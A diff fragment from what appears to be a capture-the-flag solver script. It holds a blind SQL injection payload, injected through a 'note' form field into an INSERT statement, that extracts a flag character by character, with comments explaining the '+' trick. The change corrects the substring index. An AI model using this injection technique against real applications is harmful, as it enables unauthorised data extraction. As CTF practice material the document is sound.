@@ -20,7 +20,7 @@ def try_char(char, index):
         # + in sql is used to adding so 0 + 30 = 30 and that means our guess is correct , the reason i used "+" is because the injected query is inside a value of a insert into statement so we need the select statement also to be inside the value.
         # INSERT INTO table (column1,column2 ,..) VALUES( value1,	value2 ,...); values can not a select statement directly so we need to use the "+" trick to make the select statement inside the value.
         # why not escape the whole insert into statement ? as the database in our context can only execute on query at a time.
-        payload = f"0' +(SELECT CASE WHEN substr(flag, {index+32}, 1) = '{char}' THEN '30' ELSE '10' END FROM flag));--"
+        payload = f"0' +(SELECT CASE WHEN substr(flag, {index}, 1) = '{char}' THEN '30' ELSE '10' END FROM flag));--"
         data = {
             "note": payload
         }
